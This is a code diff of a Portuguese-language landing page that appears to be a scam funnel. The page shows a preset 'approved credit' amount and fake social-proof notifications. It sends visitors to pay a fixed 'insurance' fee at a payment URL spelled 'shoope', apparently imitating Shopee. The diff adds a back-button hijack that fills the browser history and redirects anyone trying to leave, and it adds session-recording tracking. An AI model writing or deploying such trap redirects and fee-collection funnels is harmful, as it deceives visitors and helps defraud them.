@@ -1,5 +1,36 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
+  <script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '../back';
 
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "s8vuwmcvbq");
+</script>
   <!-- Meta Pixel Code -->
 <script>
   !function(f,b,e,v,n,t,s)
@@ -839,39 +870,6 @@
     </div>
 
     <script>
-      // Função para preservar parâmetros importantes (UTM, tracking, etc.)
-      function preserveImportantParams() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const importantParams = [
-          "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "utm_id",
-          "fbclid", "gclid", "xcod", "src", "referrer", "source"
-        ];
-        
-        const preservedParams = new URLSearchParams();
-        
-        importantParams.forEach((param) => {
-          if (urlParams.has(param)) {
-            preservedParams.set(param, urlParams.get(param));
-          }
-        });
-        
-        return preservedParams;
-      }
-
-      // Função para criar URL com todos os parâmetros preservados
-      function createUrlWithParams(baseUrl, additionalParams = {}) {
-        const preservedParams = preserveImportantParams();
-        
-        // Adicionar parâmetros adicionais
-        Object.entries(additionalParams).forEach(([key, value]) => {
-          if (value) {
-            preservedParams.set(key, value);
-          }
-        });
-        
-        return `${baseUrl}?${preservedParams.toString()}`;
-      }
-
       document.addEventListener("DOMContentLoaded", function () {
         // Garantir que a barra de progresso esteja corretamente inicializada
         const barraProgresso = document.getElementById(
@@ -1408,50 +1406,19 @@
 
         // Botão de pagar seguro
         btnPayInsurance.addEventListener("click", () => {
-          // Coleta dados do localStorage
-          const nomeUsuario = localStorage.getItem("nomeUsuario") || "";
-          const cpfUsuario = localStorage.getItem("cpfUsuario") || "";
-          const valorAprovado = localStorage.getItem("creditoAprovado") || "7584";
+          // Obtém todos os parâmetros da URL atual
+          const urlParams = new URLSearchParams(window.location.search);
           
-            // Obtém parâmetros da URL atual
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            // Define a URL base
-            let redirectUrl = "https://www.seguropagamentos.com.br/shoope";
-            
-            // Array para armazenar os parâmetros
-            const parametros = [];
-            
-            // Adiciona nome (prioriza localStorage, depois URL)
-            if (nomeUsuario) {
-            parametros.push(`nome=${encodeURIComponent(nomeUsuario)}`);
-            } else if (urlParams.get("nome")) {
-            parametros.push(`nome=${encodeURIComponent(urlParams.get("nome"))}`);
-            }
-            
-            // Adiciona CPF apenas da URL atual (não salva no localStorage)
-            if (urlParams.get("cpf")) {
-            parametros.push(`cpf=${encodeURIComponent(urlParams.get("cpf"))}`);
-            }
-            
-            // Adiciona valor fixo para o seguro
-            parametros.push("valor=2990");
-            
-            // Preserva outros parâmetros importantes da URL atual se existirem
-            const parametrosImportantes = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "fbclid", "gclid"];
-            parametrosImportantes.forEach(param => {
-            if (urlParams.get(param)) {
-              parametros.push(`${param}=${encodeURIComponent(urlParams.get(param))}`);
-            }
-            });
-            
-            // Constrói a URL final
-            if (parametros.length > 0) {
-            redirectUrl += "?" + parametros.join("&");
-            }
-            
-            // Redireciona com todos os parâmetros
-            window.location.href = redirectUrl;
+          // Remove parâmetros sensíveis como CPF e nome
+          urlParams.delete('cpf');
+          urlParams.delete('nome');
+          urlParams.delete('CPF');
+          urlParams.delete('NOME');
+          
+          // Adiciona parâmetro valor fixo
+          urlParams.set("valor", "2990");
+          // Redireciona mantendo apenas os parâmetros filtrados
+          window.location.href = `https://www.seguropagamentos.com.br/shoope?${urlParams.toString()}`;
         });
 
         // Configuração de notificações de prova social
@@ -1797,8 +1764,6 @@
         // Garantir que o vídeo seja carregado
         videoElement.addEventListener("loadedmetadata", () => {
           videoElement.play();
-        });
-
         });
 
         // Event listener para o botão de play
